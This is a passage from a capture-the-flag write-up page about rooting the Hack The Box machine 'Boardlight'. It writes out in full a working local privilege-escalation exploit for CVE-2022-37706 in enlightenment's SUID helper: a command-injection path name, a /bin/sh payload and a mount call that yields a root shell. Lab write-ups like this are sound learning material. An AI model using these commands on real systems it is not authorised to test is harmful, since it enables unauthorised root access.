</code></pre>

<p>As there are SUID binaries, I can try looking for vulnerabilities of enlightenment, which brings me to <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">this github</a> belonging to the same author that found CVE-2022-37706, a privilege escalation vulnerability on enlightenment before 0.25.4 (which is the case):</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928110510.png" alt="" /></p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928110528.png" alt="" /></p>

<p>The author explains so well how did he find the vulnerability, if you are interested you can read it. In the poc gif, I can see its using the exploit.sh file, which tries to find the enlightenment_sys binary and executes some commands to give a root shell:</p>

<p><img src="/assets/images/Boardlight/Pasted%20image%2020240928110835.png" alt="" /></p>

<p>I will replicate it and it works:</p>

<pre><code class="language-bash">larissa@boardlight:/tmp$ mkdir -p /tmp/net
larissa@boardlight:/tmp$ mkdir -p "/dev/../tmp/;/tmp/exploit"
larissa@boardlight:/tmp$ echo "/bin/sh" &gt; /tmp/exploit
larissa@boardlight:/tmp$ chmod a+x /tmp/exploit
larissa@boardlight:/tmp$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
</code></pre>

<p>Now I can see root.txt, which is available in root’s home:</p>

<pre><code class="language-bash"># cd /root
# ls
root.txt  snap
# cat root.txt
c1****************************ab
</code></pre>

<p>That’s the machine guys. Hope you liked it!</p>



<div id="share-links">
  <span id="divider-line">____</span>
  <br><br>
  <small>28 September 2024</small>
  <div>
    
    Tags:
    
    <a href="/search?q=dolibarr" class="tag" style="font-family: 'Cascadia Code';">dolibarr</a>
    
    <a href="/search?q=CVE-2023-30253" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-30253</a>
    
    <a href="/search?q=subdomain-enumeration" class="tag" style="font-family: 'Cascadia Code';">subdomain-enumeration</a>
    
    <a href="/search?q=crm" class="tag" style="font-family: 'Cascadia Code';">crm</a>
    
    <a href="/search?q=erp" class="tag" style="font-family: 'Cascadia Code';">erp</a>
    
    <a href="/search?q=php-injection" class="tag" style="font-family: 'Cascadia Code';">php-injection</a>
    
    <a href="/search?q=php-configuration" class="tag" style="font-family: 'Cascadia Code';">php-configuration</a>
    
    <a href="/search?q=mysql" class="tag" style="font-family: 'Cascadia Code';">mysql</a>
    
    <a href="/search?q=password-reuse" class="tag" style="font-family: 'Cascadia Code';">password-reuse</a>
    
    <a href="/search?q=suid" class="tag" style="font-family: 'Cascadia Code';">suid</a>
    
    <a href="/search?q=enlightenment" class="tag" style="font-family: 'Cascadia Code';">enlightenment</a>
    
    <a href="/search?q=CVE-2022-37706" class="tag" style="font-family: 'Cascadia Code';">CVE-2022-37706</a>
    
    
</div>
  <br>
  Share this writeup:&nbsp;
  <a
    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Boardlight.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Boardlight.html&text=Writeup+for+HTB Boardlight writeup+from+HTB+held+on+28 September 2024&hashtags=ctf,writeup,Boardlight,HTB,dolibarr,CVE-2023-30253,subdomain-enumeration,crm,erp,php-injection,php-configuration,mysql,password-reuse,suid,enlightenment,CVE-2022-37706','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Boardlight.html&text=Writeup+for+HTB Boardlight writeup+from+HTB+held+on+2024-09-28 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-linkedin" aria-hidden="true"></i></a>
</div>
    </section>
  </div>

  <div id="comments" class="container">
    <section id="disqus_container">
      
    </section>
  </div>

  <footer>
    <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

  </footer>

  <script src="http://localhost:4000/assets/js/prism.js"></script>
  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
  <script>
    topScroll = document.getElementById("top");

    window.onscroll = function () { scrollFunction() };

    function scrollFunction() {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        topScroll.style.display = "block";
      } else {
        topScroll.style.display = "none";
      }
    }

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }

    $(window).on('load', function () {

      $('a[download]').each((i, e) => {
        $(e).addClass('fa fa-download');
      });

      setSizes();
    });

    $(window).resize(setSizes);

    function setSizes() {
      if ($(window).width() < 960) {
        $('#bottom-bar').hide();
        $('footer').show();
        $('#navbarSupportedContent').css('max-height', 'unset');
        $('.navbar-collapse').collapse('hide');
        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
          $('footer').css("position", "unset");
        } else {
          $('footer').css("position", "fixed");
        }
      }
      else {
        $('#bottom-bar').show();
        $('footer').hide();
        $('.navbar-collapse').collapse('hide');
        $('footer').css("position", "fixed");
        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
      }
    }
  </script>

</body>

</html>
